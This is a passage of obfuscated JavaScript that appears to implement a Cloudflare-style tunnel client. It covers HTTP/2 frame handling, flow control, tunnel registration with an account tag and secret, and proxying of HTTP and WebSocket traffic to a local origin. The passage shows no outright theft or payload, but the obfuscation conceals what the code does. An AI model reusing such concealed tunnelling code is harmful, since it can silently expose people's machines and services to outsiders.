                this['buffer'] = Buffer['alloc'](0x0);
                continue;
            case '4':
                this[cZ(0x3bc)] = [];
                continue;
            case '5':
                this[cZ(0x588)] = null;
                continue;
            case '6':
                a['on'](b[cZ(0x7f2)], f => {
                    const d1 = cZ;
                    this[d1(0x422)] = this['buffer'][d1(0x32c)] ? Buffer[d1(0x327)]([
                        this[d1(0x422)],
                        f
                    ]) : f, this[d1(0x825)]();
                });
                continue;
            case '7':
                a['on'](b[cZ(0x864)], () => {
                    const d2 = cZ;
                    this[d2(0x799)] = !![], this[d2(0x825)]();
                });
                continue;
            case '8':
                a['on'](cZ(0x6af), () => {
                    const d3 = cZ;
                    this[d3(0x799)] = !![], this[d3(0x825)]();
                });
                continue;
            }
            break;
        }
    }
    ['_drain']() {
        const d4 = a0aQ, a = {
                'rYNcF': function (b, c) {
                    return b > c;
                },
                'MALLl': function (b, c) {
                    return b !== c;
                },
                'VklzH': d4(0x638)
            };
        while (a[d4(0x3d1)](this['waiters'][d4(0x32c)], 0x0)) {
            const b = this[d4(0x3bc)][0x0];
            if (this['buffer'][d4(0x32c)] >= b[d4(0x212)]) {
                this[d4(0x3bc)][d4(0x2c5)]();
                const c = this[d4(0x422)][d4(0x88a)](0x0, b[d4(0x212)]);
                this['buffer'] = this['buffer'][d4(0x88a)](b[d4(0x212)]), b['resolve'](c);
            } else {
                if (a[d4(0x299)](this[d4(0x588)], null))
                    this['waiters'][d4(0x2c5)](), b['reject'](this[d4(0x588)]);
                else {
                    if (this[d4(0x799)])
                        this[d4(0x3bc)][d4(0x2c5)](), b[d4(0x6e1)](new Error(a[d4(0x4c1)]));
                    else
                        break;
                }
            }
        }
    }
    [a0aQ(0x560)](a) {
        const d5 = a0aQ, b = {
                'NYoZo': function (c, d) {
                    return c !== d;
                },
                'WxTGt': function (c, d) {
                    return c >= d;
                },
                'MGoNU': d5(0x638)
            };
        if (b['NYoZo'](this[d5(0x588)], null))
            return Promise[d5(0x6e1)](this['errored']);
        if (b['WxTGt'](this['buffer'][d5(0x32c)], a)) {
            const c = this[d5(0x422)]['subarray'](0x0, a);
            return this[d5(0x422)] = this['buffer'][d5(0x88a)](a), Promise[d5(0x26a)](c);
        }
        if (this[d5(0x799)])
            return Promise[d5(0x6e1)](new Error(b[d5(0x526)]));
        return new Promise((d, f) => {
            const d6 = d5;
            this[d6(0x3bc)]['push']({
                'need': a,
                'resolve': d,
                'reject': f
            }), this['_drain']();
        });
    }
}
class a0au {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const d7 = a0aQ, l = {
                'IfJfK': d7(0x3fc),
                'EdQAp': function (o, p) {
                    return o || p;
                }
            }, m = l['IfJfK'][d7(0x281)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this[d7(0x246)] = d;
                continue;
            case '1':
                this[d7(0x6e6)] = ![];
                continue;
            case '2':
                this['windowWaiters'] = [];
                continue;
            case '3':
                this['connIndex'] = g;
                continue;
            case '4':
                this[d7(0x2e8)] = b;
                continue;
            case '5':
                this['accountTag'] = c;
                continue;
            case '6':
                this[d7(0x598)] = j;
                continue;
            case '7':
                this['streams'] = new Map();
                continue;
            case '8':
                this[d7(0x6f7)] = h;
                continue;
            case '9':
                this[d7(0x6c4)] = f;
                continue;
            case '10':
                this[d7(0x6d0)] = 0xffff;
                continue;
            case '11':
                this['sock'] = a;
                continue;
            case '12':
                this[d7(0x486)] = i;
                continue;
            case '13':
                this[d7(0x4ad)] = ![];
                continue;
            case '14':
                this[d7(0x727)] = new a0ac();
                continue;
            case '15':
                this['tunnelState'] = l[d7(0x321)](k, { 'printed': ![] });
                continue;
            case '16':
                this[d7(0x78c)] = new a0at(a);
                continue;
            case '17':
                this[d7(0x43c)] = a0a3;
                continue;
            case '18':
                this[d7(0x7aa)] = new Map();
                continue;
            case '19':
                this[d7(0x270)] = null;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x6d3)](a, b, c, d = Buffer[a0aQ(0x43b)](0x0)) {
        const d8 = a0aQ, f = {
                'czzat': function (h, i) {
                    return h > i;
                },
                'nhaRn': 'HTTP/2\x20frame\x20too\x20large',
                'HVMvp': function (h, i) {
                    return h & i;
                }
            };
        if (f[d8(0x7bc)](d[d8(0x32c)], 0xffffff))
            throw new Error(f['nhaRn']);
        const g = Buffer[d8(0x43b)](0x9);
        g[d8(0x4b7)](d[d8(0x32c)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[d8(0x44a)](f[d8(0x349)](c, 0x7fffffff), 0x5), this['sock'][d8(0x1c7)](Buffer['concat']([
            g,
            d
        ]));
    }
    [a0aQ(0x2e5)](a, b, c = ![]) {
        const d9 = a0aQ, d = {
                'BnNSA': function (h, i) {
                    return h(i);
                },
                'cuBGl': function (h, i) {
                    return h | i;
                }
            }, f = d[d9(0x5c9)](a0af, b), g = d[d9(0x68b)](0x4, c ? 0x1 : 0x0);
        this['sendFrame'](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const da = a0aQ, b = {
                'LADHR': function (c, d) {
                    return c > d;
                },
                'sMHmM': function (c, d) {
                    return c > d;
                }
            };
        if (b[da(0x30e)](this[da(0x6d0)], 0x0) && b['sMHmM'](this[da(0x7aa)][da(0x52b)](a) ?? 0xffff, 0x0))
            return Promise[da(0x26a)]();
        return new Promise(c => {
            const db = da;
            this[db(0x76a)][db(0x381)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aQ(0x897)]() {
        const dc = a0aQ, a = [];
        for (const b of this[dc(0x76a)]) {
            const c = this[dc(0x7aa)]['get'](b[dc(0x6c7)]) ?? 0xffff;
            this[dc(0x6d0)] > 0x0 && c > 0x0 ? b[dc(0x26a)]() : a[dc(0x381)](b);
        }
        this['windowWaiters'] = a;
    }
    ['_releaseWaiters']() {
        const dd = a0aQ;
        for (const a of this[dd(0x76a)]) {
            a['resolve']();
        }
        this[dd(0x76a)] = [];
    }
    async [a0aQ(0x433)](a, b, c = ![]) {
        const de = a0aQ, d = {
                'iMyTh': function (h, i) {
                    return h - i;
                },
                'eQaGT': function (h, i) {
                    return h + i;
                },
                'EdTTL': function (h, i) {
                    return h - i;
                },
                'PQvDw': function (h, i) {
                    return h < i;
                }
            }, f = b['length'];
        let g = 0x0;
        do {
            await this[de(0x20b)](a);
            if (this['stopped'])
                return;
            const h = this[de(0x7aa)][de(0x52b)](a) ?? 0xffff, i = Math[de(0x369)](d[de(0x26e)](f, g), this[de(0x6d0)], h, this['peerMaxFrame']), j = c && d[de(0x75b)](g, i) >= f ? 0x1 : 0x0, k = b[de(0x88a)](g, g + i);
            this[de(0x6d0)] -= i, this[de(0x7aa)]['set'](a, d[de(0x5ba)](h, i)), this[de(0x6d3)](0x0, j, a, k), g += i;
        } while (d[de(0x5b9)](g, f));
    }
    [a0aQ(0x32d)](a, b) {
        const df = a0aQ, c = {
                'rNrxc': function (d, f) {
                    return d > f;
                }
            };
        if (c[df(0x203)](b, 0x0)) {
            const d = Buffer[df(0x43b)](0x4);
            d[df(0x44a)](b & 0x7fffffff, 0x0), this[df(0x6d3)](0x8, 0x0, a, d);
        }
    }
    async ['readFrame']() {
        const dg = a0aQ, a = {
                'LXycs': function (i, j) {
                    return i & j;
                }
            }, b = await this['reader']['readExact'](0x9), c = b['readUIntBE'](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[dg(0x646)](b[dg(0x4de)](0x5), 0x7fffffff), h = await this[dg(0x78c)][dg(0x560)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aQ(0x7ab)](a, b, c) {
        const dh = a0aQ, d = {
                'HqVNk': function (g, h) {
                    return g & h;
                },
                'XkmNL': function (g, h) {
                    return g > h;
                },
                'MqBrL': dh(0x7d5),
                'EstfS': function (g, h) {
                    return g - h;
                },
                'FAjdF': function (g, h) {
                    return g & h;
                },
                'UzDAb': function (g, h) {
                    return g !== h;
                },
                'KQYaL': 'expected\x20CONTINUATION\x20frame'
            };
        if (d['HqVNk'](a, 0x8)) {
            const g = c[0x0];
            c = c[dh(0x88a)](0x1);
            if (d['XkmNL'](g, c[dh(0x32c)]))
                throw new Error(d[dh(0x2f3)]);
            c = g ? c[dh(0x88a)](0x0, d[dh(0x41a)](c[dh(0x32c)], g)) : c;
        }
        d[dh(0x877)](a, 0x20) && (c = c['subarray'](0x5));
        const f = [c];
        while (!d[dh(0x5c3)](a, 0x4)) {
            const h = await this[dh(0x785)]();
            if (d[dh(0x585)](h[0x0], 0x9) || h[0x2] !== b)
                throw new Error(d[dh(0x72d)]);
            f[dh(0x381)](h[0x3]), a = h[0x1];
        }
        return this[dh(0x727)][dh(0x2b0)](Buffer[dh(0x327)](f));
    }
    ['openControl'](a) {
        const di = a0aQ, b = {
                'uyElf': function (c, d) {
                    return c !== d;
                },
                'MRZWQ': ':status',
                'tBnmz': '200'
            };
        if (b[di(0x39f)](this[di(0x270)], null))
            return;
        this['control'] = new a0aw(this, a, this[di(0x6f7)]), this['sendHeaders'](a, [[
                b[di(0x610)],
                b[di(0x586)]
            ]]), this['control']['start'](this[di(0x441)], this['tunnelSecret'], this[di(0x6c4)], this['connIndex']);
    }
    ['updateConfig'](a, b) {
        const dj = a0aQ, c = {
                'zcoxN': dj(0x592),
                'fVtMp': function (g, h, i) {
                    return g(h, i);
                },
                'KkfEM': dj(0x6ab),
                'qDjGC': 'content-length'
            };
        let d = 0x0;
        try {
            const g = JSON[dj(0x4d7)](b[dj(0x32c)] ? b['toString'](c['zcoxN']) : '{}'), h = c['fVtMp'](parseInt, g[dj(0x5c5)], 0xa);
            !Number[dj(0x697)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[dj(0x45b)](JSON[dj(0x656)]({ 'latestAppliedVersion': d }));
        this['sendHeaders'](a, [
            [
                dj(0x62f),
                '200'
            ],
            [
                'content-type',
                c[dj(0x25a)]
            ],
            [
                c[dj(0x561)],
                String(f[dj(0x32c)])
            ]
        ]), this[dj(0x433)](a, f, !![]);
    }
    [a0aQ(0x2b2)](a, b) {
        const dk = a0aQ, c = {
                'cCJIH': function (d, f) {
                    return d === f;
                },
                'wpAKM': 'update-configuration'
            };
        if (c[dk(0x5bb)](b[dk(0x6b1)], c[dk(0x87e)])) {
            this[dk(0x1dc)](a, Buffer[dk(0x327)](b[dk(0x554)]));
            return;
        }
        if (b[dk(0x862)])
            return;
        if (b[dk(0x7b1)])
            return;
        b['finished'] = !![], this['proxyRequest'](a, b)[dk(0x5e7)](() => {
        });
    }
    async [a0aQ(0x4e1)](a, b) {
        const dl = a0aQ, c = {
                'XRgXb': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'fyFLN': function (d, f) {
                    return d === f;
                },
                'WkLSp': dl(0x48b),
                'CHyGL': dl(0x876),
                'AKoog': dl(0x51a),
                'whgKi': dl(0x493),
                'OXUNc': dl(0x57b),
                'LdzrJ': dl(0x6b1),
                'PKpCH': dl(0x75e),
                'GWDGt': 'content-type',
                'vdEmN': ':status',
                'rfmqW': function (d, f) {
                    return d(f);
                },
                'SYrJT': 'cf-cloudflared-response-headers',
                'LuBLf': dl(0x747),
                'ksVWz': dl(0x689),
                'BCPjh': function (d, f) {
                    return d + f;
                },
                'dIIZw': function (d, f) {
                    return d + f;
                },
                'wrXeh': dl(0x2db),
                'tzOvx': dl(0x2f2)
            };
        try {
            const d = await c[dl(0x426)](a0az, this[dl(0x2e8)], b[dl(0x213)], b[dl(0x793)], b['headers'], Buffer['concat'](b['body'])), f = [], g = [];
            for (const [k, l] of d[dl(0x74e)]) {
                const m = k[dl(0x207)]();
                c['fyFLN'](m, c[dl(0x64f)]) && g['push']([
                    m,
                    l
                ]);
                const n = m['startsWith'](c[dl(0x79f)]) || m['startsWith'](c['AKoog']) || m[dl(0x86b)](c['whgKi']) || m[dl(0x86b)](':');
                (!n || c['fyFLN'](m, c[dl(0x2b9)]) || c['fyFLN'](m, c['LdzrJ']) || m === c[dl(0x268)]) && f[dl(0x381)]([
                    m,
                    l
                ]);
            }
            if (!f['some'](([o]) => o === dl(0x22d))) {
                const o = a0ao(b['path']);
                o && f[dl(0x381)]([
                    c[dl(0x35c)],
                    o
                ]);
            }
            const h = a0as(f), i = d[dl(0x765)] === 0x65 ? 0xc8 : d[dl(0x765)], j = [
                    [
                        c['vdEmN'],
                        c[dl(0x6c9)](String, i)
                    ],
                    ...g,
                    [
                        c[dl(0x266)],
                        h
                    ],
                    [
                        c[dl(0x4ba)],
                        c[dl(0x5e5)]
                    ]
                ];
            this[dl(0x2e5)](a, j);
            for await (const p of d['body']) {
                await this[dl(0x433)](a, p, ![]);
            }
            await this[dl(0x433)](a, Buffer[dl(0x43b)](0x0), !![]);
        } catch (q) {
            this['log'][dl(0x1d8)](c[dl(0x59b)](c[dl(0x541)]('stream\x20' + a, c[dl(0x3de)]), q));
            try {
                this[dl(0x2e5)](a, [[
                        c['vdEmN'],
                        c[dl(0x81c)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aQ(0x513)]() {
        const dm = a0aQ, a = {
                'SYMuZ': 'PRI\x20*\x20HTTP/2.0\x0d\x0a\x0d\x0aSM\x0d\x0a\x0d\x0a',
                'aHIiH': dm(0x734),
                'UkvNP': function (d, f) {
                    return d === f;
                },
                'uYhxf': function (d, f) {
                    return d & f;
                },
                'jGcad': function (d, f) {
                    return d + f;
                },
                'ebneD': function (d, f) {
                    return d === f;
                },
                'VXrNp': function (d, f) {
                    return d - f;
                },
                'eLbAo': function (d, f) {
                    return d === f;
                },
                'BuReZ': function (d, f) {
                    return d >= f;
                },
                'zgDgE': function (d, f) {
                    return d <= f;
                },
                'IdMCP': function (d, f) {
                    return d === f;
                },
                'hFfLy': function (d, f) {
                    return d & f;
                },
                'PjiIQ': function (d, f) {
                    return d !== f;
                },
                'cFxAZ': function (d, f) {
                    return d + f;
                },
                'wlugB': function (d, f) {
                    return d === f;
                },
                'Obojl': function (d, f) {
                    return d === f;
                }
            }, b = await this[dm(0x78c)][dm(0x560)](0x18);
        if (!b['equals'](Buffer[dm(0x45b)](a['SYMuZ'])))
            throw new Error(a['aHIiH']);
        const c = Buffer[dm(0x43b)](0x6);
        c[dm(0x3b3)](0x3, 0x0), c[dm(0x44a)](0x64, 0x2), this['sendFrame'](0x4, 0x0, 0x0, c);
        this['showTunnel'] && !this[dm(0x28a)]['printed'] && (process['stdout']['write'](this[dm(0x486)] + '\x0a'), this[dm(0x28a)][dm(0x6be)] = !![]);
        try {
            while (!this['stopped']) {
                const [d, f, g, h] = await this[dm(0x785)]();
                if (a[dm(0x277)](d, 0x4)) {
                    if (!a[dm(0x3f5)](f, 0x1)) {
                        if (h[dm(0x32c)] % 0x6)
                            throw new Error(dm(0x789));
                        for (let i = 0x0; i < h['length']; i += 0x6) {
                            const j = h[dm(0x7a8)](i), k = h[dm(0x4de)](a[dm(0x24c)](i, 0x2));
                            if (a['ebneD'](j, 0x4)) {
                                const l = a[dm(0x361)](k, 0xffff);
                                for (const m of this['streamWindows'][dm(0x38a)]()) {
                                    this[dm(0x7aa)][dm(0x3f0)](m, Math['max'](0x0, a[dm(0x24c)](this[dm(0x7aa)][dm(0x52b)](m), l)));
                                }
                            } else
                                a[dm(0x23f)](j, 0x5) && a[dm(0x4f1)](k, 0x4000) && a[dm(0x2ee)](k, 0xffffff) && (this[dm(0x43c)] = k);
                        }
                        this[dm(0x6d3)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[dm(0x294)](d, 0x6)) {
                    !a[dm(0x6aa)](f, 0x1) && this[dm(0x6d3)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a['IdMCP'](d, 0x8)) {
                    if (a[dm(0x716)](h[dm(0x32c)], 0x4))
                        continue;
                    const n = a[dm(0x3f5)](h['readUInt32BE'](0x0), 0x7fffffff);
                    a[dm(0x277)](g, 0x0) ? this[dm(0x6d0)] += n : this['streamWindows'][dm(0x3f0)](g, a[dm(0x33f)](this[dm(0x7aa)]['get'](g) ?? 0xffff, n));
                    this[dm(0x897)]();
                    continue;
                }
                if (a[dm(0x779)](d, 0x3)) {
                    this[dm(0x1e9)][dm(0x3e7)](g);
                    continue;
                }
                if (a[dm(0x333)](d, 0x7))
                    break;
                if (a[dm(0x684)](d, 0x1)) {
                    const o = await this[dm(0x7ab)](f, g, h);
                    !this['streamWindows']['has'](g) && this[dm(0x7aa)][dm(0x3f0)](g, 0xffff);
                    this['handleHeaders'](g, f, o);
                    continue;
                }
                if (a[dm(0x333)](d, 0x0)) {
                    this[dm(0x485)](g, f, h);
                    continue;
                }
            }
        } finally {
            this['stopped'] = !![], this[dm(0x411)]();
            for (const p of this[dm(0x1e9)][dm(0x2d1)]()) {
                p[dm(0x776)] && p['websocketProxy']['stop']();
            }
            try {
                this[dm(0x66e)]['destroy']();
            } catch (q) {
            }
        }
    }
    ['handleHeaders'](a, b, c) {
        const dn = a0aQ, d = {
                'YrWnI': function (i, j) {
                    return i === j;
                },
                'AokQP': function (i, j) {
                    return i & j;
                },
                'Zynjq': 'GET',
                'RTyTg': ':authority',
                'mhqEm': function (i, j) {
                    return i === j;
                },
                'ycHTZ': dn(0x862),
                'ixIUl': function (i, j) {
                    return i === j;
                },
                'Whlvv': function (i, j) {
                    return i(j);
                }
            }, f = {};
        for (const [i, j] of c) {
            i[dn(0x86b)](':') ? f[i] = j : f[i[dn(0x207)]()] = j;
        }
        const g = (f[a0a1] || '')['trim']()[dn(0x207)]();
        if (d['YrWnI'](g, a0a2)) {
            this[dn(0x756)](a);
            d['AokQP'](b, 0x1) && (this[dn(0x270)][dn(0x7b1)] = !![]);
            return;
        }
        const h = {
            'method': f[dn(0x6e3)] || d[dn(0x402)],
            'path': f[dn(0x787)] || '/',
            'authority': f[d[dn(0x241)]] || '',
            'headers': c[dn(0x4c7)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': d['mhqEm'](g, d[dn(0x830)]) || d[dn(0x34b)]((f[dn(0x5ab)] || '')[dn(0x207)](), dn(0x862)),
            'ended': d[dn(0x6f2)](Boolean, d[dn(0x798)](b, 0x1)),
            'finished': ![]
        };
        this[dn(0x1e9)]['set'](a, h);
        if (h[dn(0x862)])
            h['websocketProxy'] = new a0av(this, a, h, this[dn(0x2e8)], this[dn(0x6f7)]), h[dn(0x776)][dn(0x6ea)]();
        else
            h[dn(0x56d)] && this['requestFinished'](a, h);
    }
    [a0aQ(0x485)](a, b, c) {
        const dp = a0aQ, d = {
                'uZeAT': function (g, h) {
                    return g !== h;
                },
                'XnEXz': function (g, h) {
                    return g === h;
                },
                'SBdwS': function (g, h) {
                    return g & h;
                },
                'cfXVM': function (g, h) {
                    return g(h);
                },
                'iRztJ': function (g, h) {
                    return g & h;
                }
            };
        this[dp(0x32d)](0x0, c[dp(0x32c)]), this[dp(0x32d)](a, c[dp(0x32c)]);
        if (d[dp(0x4b4)](this['control'], null) && d[dp(0x556)](this['control'][dp(0x6c7)], a)) {
            this[dp(0x270)][dp(0x414)](c);
            d[dp(0x2b1)](b, 0x1) && (this[dp(0x270)][dp(0x7b1)] = !![]);
            return;
        }
        const f = this[dp(0x1e9)][dp(0x52b)](a);
        if (d[dp(0x556)](f, undefined))
            return;
        if (f['websocketProxy'] !== undefined) {
            f[dp(0x776)][dp(0x414)](c, d[dp(0x6dc)](Boolean, d['iRztJ'](b, 0x1)));
            return;
        }
        c[dp(0x32c)] && f[dp(0x554)][dp(0x381)](c), d['iRztJ'](b, 0x1) && (f[dp(0x56d)] = !![], this['requestFinished'](a, f));
    }
}
class a0av {
    constructor(a, b, c, d, f) {
        const dq = a0aQ;
        this['connection'] = a, this[dq(0x6c7)] = b, this['request'] = c, this['origin'] = d, this[dq(0x6f7)] = f, this[dq(0x466)] = [], this[dq(0x3bc)] = [], this[dq(0x4ad)] = ![], this['sock'] = null;
    }
    [a0aQ(0x6ea)]() {
        this['run']()['catch'](() => {
        });
    }
    [a0aQ(0x414)](a, b = ![]) {
        const dr = a0aQ;
        a[dr(0x32c)] && this['queue'][dr(0x381)](a), b && this['queue'][dr(0x381)](null), this['_wake']();
    }
    [a0aQ(0x374)]() {
        const ds = a0aQ, a = {
                'VGuTt': function (b, c) {
                    return b !== c;
                }
            };
        if (this['stopped'])
            return;
        this['stopped'] = !![], this[ds(0x2fd)]();
        if (a['VGuTt'](this['sock'], null))
            try {
                this[ds(0x66e)][ds(0x79b)]();
            } catch (b) {
            }
    }
    [a0aQ(0x2fd)]() {
        const dt = a0aQ, a = {
                'zkOak': function (b) {
                    return b();
                }
            };
        for (const b of this[dt(0x3bc)]) {
            a['zkOak'](b);
        }
        this[dt(0x3bc)] = [];
    }
    async [a0aQ(0x390)]() {
        const du = a0aQ;
        while (!this[du(0x4ad)]) {
            if (this[du(0x466)][du(0x32c)])
                return this['queue'][du(0x2c5)]();
            await new Promise(a => this['waiters'][du(0x381)](a));
        }
        return null;
    }
    async [a0aQ(0x513)]() {
        const dv = a0aQ, a = {
                'ZAcyL': function (b, c) {
                    return b(c);
                },
                'qczDC': function (b, c) {
                    return b(c);
                },
                'hEOVj': dv(0x48b),
                'SFqkU': 'cf-int-',
                'wUkYl': dv(0x51a),
                'STfyi': 'cf-proxy-',
                'Qxoiz': function (b, c) {
                    return b === c;
                },
                'gsMtb': dv(0x57b),
                'FTnkv': dv(0x6b1),
                'AzPGs': dv(0x75e),
                'BJRTq': function (b, c) {
                    return b(c);
                },
                'SRGBM': dv(0x62f),
                'OzhqZ': dv(0x747),
                'vvZYe': dv(0x689),
                'kmZYy': function (b, c) {
                    return b + c;
                },
                'zhIrd': function (b, c) {
                    return b + c;
                },
                'ostIJ': function (b, c) {
                    return b + c;
                },
                'iknUF': dv(0x828),
                'YKdTe': dv(0x3d9),
                'zgfvI': dv(0x2f2)
            };
        try {
            this[dv(0x66e)] = await a[dv(0x200)](a0ax, this[dv(0x2e8)]), this[dv(0x681)]();
            const b = await a['qczDC'](a0aA, this['sock']), c = [], d = [];
            for (const [i, j] of b[dv(0x74e)]) {
                const k = i[dv(0x207)]();
                k === a[dv(0x5d1)] && d[dv(0x381)]([
                    k,
                    j
                ]);
                const l = k[dv(0x86b)](a[dv(0x7da)]) || k[dv(0x86b)](a[dv(0x5b2)]) || k['startsWith'](a[dv(0x625)]) || k[dv(0x86b)](':');
                (!l || a['Qxoiz'](k, a[dv(0x29e)]) || a[dv(0x883)](k, a[dv(0x23c)]) || a[dv(0x883)](k, a[dv(0x380)])) && c['push']([
                    k,
                    j
                ]);
            }
            const f = a[dv(0x6b2)](a0as, c), g = a['Qxoiz'](b[dv(0x765)], 0x65) ? 0xc8 : b[dv(0x765)], h = [
                    [
                        a[dv(0x4ec)],
                        a[dv(0x34f)](String, g)
                    ],
                    ...d,
                    [
                        dv(0x7ad),
                        f
                    ],
                    [
                        a['OzhqZ'],
                        a['vvZYe']
                    ]
                ];
            this[dv(0x57b)][dv(0x2e5)](this[dv(0x6c7)], h), this['writeToOrigin']()[dv(0x5e7)](() => {
            }), await this[dv(0x455)](b[dv(0x7a9)]);
        } catch (m) {
            this['log'][dv(0x1d8)](a[dv(0x4ce)](a[dv(0x52d)](a[dv(0x284)](a[dv(0x305)], this[dv(0x6c7)]), a['YKdTe']), m));
            try {
                this[dv(0x57b)]['sendHeaders'](this[dv(0x6c7)], [[
                        dv(0x62f),
                        a['zgfvI']
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[dv(0x374)]();
        }
    }
    async [a0aQ(0x455)](a) {
        const dw = a0aQ;
        a[dw(0x32c)] && await this[dw(0x57b)][dw(0x433)](this['streamId'], a, ![]);
        for await (const b of this['sock']) {
            if (this['stopped'])
                break;
            await this[dw(0x57b)][dw(0x433)](this[dw(0x6c7)], b, ![]);
        }
        !this[dw(0x4ad)] && await this[dw(0x57b)][dw(0x433)](this[dw(0x6c7)], Buffer[dw(0x43b)](0x0), !![]);
    }
    async [a0aQ(0x251)]() {
        const dx = a0aQ;
        while (!this[dx(0x4ad)]) {
            const a = await this[dx(0x390)]();
            if (a === null)
                return;
            try {
                this[dx(0x66e)][dx(0x1c7)](a);
            } catch (b) {
                this[dx(0x4ad)] = !![];
                return;
            }
        }
    }
    [a0aQ(0x681)]() {
        const dy = a0aQ, a = {
                'Qosxx': function (i, j) {
                    return i + j;
                },
                'KZWyt': function (i, j) {
                    return i + j;
                },
                'FjXkr': 'GET\x20',
                'FBzyj': '\x20HTTP/1.1',
                'PVeLx': function (i, j) {
                    return i === j;
                },
                'dGkht': function (i, j) {
                    return i === j;
                },
                'nRNYE': dy(0x57b),
                'CmoKm': function (i, j) {
                    return i === j;
                },
                'AHPzF': 'content-length',
                'IcPmw': function (i, j) {
                    return i === j;
                },
                'CmrSc': dy(0x2b7),
                'khzOn': function (i, j) {
                    return i === j;
                },
                'uBtAz': function (i, j) {
                    return i === j;
                },
                'JOCyS': dy(0x1f2),
                'xOxEH': 'origin',
                'LJtSx': function (i, j) {
                    return i + j;
                },
                'DbZky': dy(0x3d3),
                'EjcvZ': function (i, j) {
                    return i + j;
                },
                'BBjak': dy(0x797),
                'OPjHx': function (i, j) {
                    return i + j;
                },
                'YFWqp': dy(0x76b),
                'JXesm': dy(0x63a),
                'Emwxk': dy(0x3bb),
                'HvUQQ': dy(0x220),
                'ZPbhJ': '\x0d\x0a\x0d\x0a',
                'yEuRG': dy(0x225)
            }, b = new URL(this['origin']), c = this['request'][dy(0x793)][dy(0x86b)]('/') ? this[dy(0x719)][dy(0x793)] : '/' + this[dy(0x719)]['path'], d = [a[dy(0x50a)](a['KZWyt'](a[dy(0x366)], c), a[dy(0x4cd)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[dy(0x719)][dy(0x74e)]) {
            const k = i['toLowerCase']();
            if (a[dy(0x74b)](k, dy(0x37c)) || a[dy(0x356)](k, a['nRNYE']) || a['PVeLx'](k, 'upgrade') || a[dy(0x226)](k, a['AHPzF']) || a[dy(0x1e2)](k, a[dy(0x6eb)]))
                continue;
            if (a[dy(0x351)](k, dy(0x710)))
                f = !![];
            else {
                if (a[dy(0x7f8)](k, a['JOCyS']))
                    g = !![];
                else
                    a[dy(0x356)](k, a[dy(0x330)]) && (h = !![]);
            }
            d[dy(0x381)](a['KZWyt'](a[dy(0x4d9)](i, ':\x20'), j));
        }
        d['push'](a[dy(0x7b6)](a[dy(0x815)], b[dy(0x37c)])), !h && this[dy(0x719)]['authority'] && d[dy(0x381)](a[dy(0x71a)](a[dy(0x36c)], this[dy(0x719)]['authority'])), !f && d['push'](a[dy(0x57d)](a['YFWqp'], a0k[dy(0x1e7)](0x10)[dy(0x3e8)](a[dy(0x47c)]))), !g && d[dy(0x381)](a['Emwxk']), d[dy(0x381)]('Connection:\x20Upgrade'), d[dy(0x381)](a[dy(0x3b9)]), this[dy(0x66e)][dy(0x1c7)](Buffer[dy(0x45b)](a[dy(0x71a)](d[dy(0x48d)]('\x0d\x0a'), a[dy(0x2f5)]), a[dy(0x5ad)]));
    }
}
class a0aw {
    constructor(a, b, c) {
        const dz = a0aQ, d = { 'gYRzZ': dz(0x453) }, f = d[dz(0x832)][dz(0x281)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[dz(0x7b1)] = ![];
                continue;
            case '1':
                this[dz(0x6f7)] = c;
                continue;
            case '2':
                this[dz(0x6c7)] = b;
                continue;
            case '3':
                this[dz(0x422)] = Buffer[dz(0x43b)](0x0);
                continue;
            case '4':
                this['connection'] = a;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x6ea)](a, b, c, d) {
        const dA = a0aQ, f = {
                'ghXAw': function (g, h) {
                    return g(h);
                },
                'sGQiB': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this['connection'][dA(0x433)](this[dA(0x6c7)], f[dA(0x4df)](a0ah, 0x0), ![]), this[dA(0x57b)][dA(0x433)](this[dA(0x6c7)], f['sGQiB'](a0ai, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aQ(0x414)](a) {
        const dB = a0aQ, b = {
                'jlSQg': function (f, g) {
                    return f(g);
                },
                'fiTYO': 'tunnel\x20connection\x20registered\x20at\x20',
                'rrkWt': dB(0x87a),
                'rBtzF': function (f, g) {
                    return f + g;
                },
                'JwdYs': dB(0x60d),
                'yVTsN': dB(0x230),
                'OyDpK': function (f, g) {
                    return f + g;
                },
                'bfnKm': dB(0x732)
            };
        this[dB(0x422)] = this[dB(0x422)]['length'] ? Buffer[dB(0x327)]([
            this[dB(0x422)],
            a
        ]) : a;
        let c, d;
        [c, d] = b[dB(0x7e0)](a0aj, this[dB(0x422)]), this[dB(0x422)] = d;
        for (const f of c) {
            try {
                const g = b['jlSQg'](a0am, f);
                g['ok'] ? (this[dB(0x6f7)]['info'](b['fiTYO'] + (g[dB(0x30d)] || b['rrkWt'])), this[dB(0x57b)][dB(0x6e6)] = !![]) : this[dB(0x6f7)]['warning'](b[dB(0x29a)](b[dB(0x3b1)], g[dB(0x484)] || b['yVTsN']));
            } catch (h) {
                this[dB(0x6f7)][dB(0x4b3)](b[dB(0x512)](b[dB(0x671)], h));
            }
        }
    }
}
function a0ax(a) {
    const dC = a0aQ, b = {
            'vORqn': function (c, d, f) {
                return c(d, f);
            },
            'MmXaZ': function (c, d, f) {
                return c(d, f);
            },
            'Pclhs': dC(0x484),
            'VgFNR': dC(0x3d7),
            'lgBTm': function (c, d) {
                return c(d);
            },
            'FOKdR': dC(0x289),
            'pYDgP': dC(0x807),
            'HlInn': 'https:',
            'SwDdc': function (c, d) {
                return c === d;
            }
        };
    return new Promise((c, d) => {
        const dD = dC, f = { 'OzYuO': 'error' };
        let g;
        try {
            g = new URL(a);
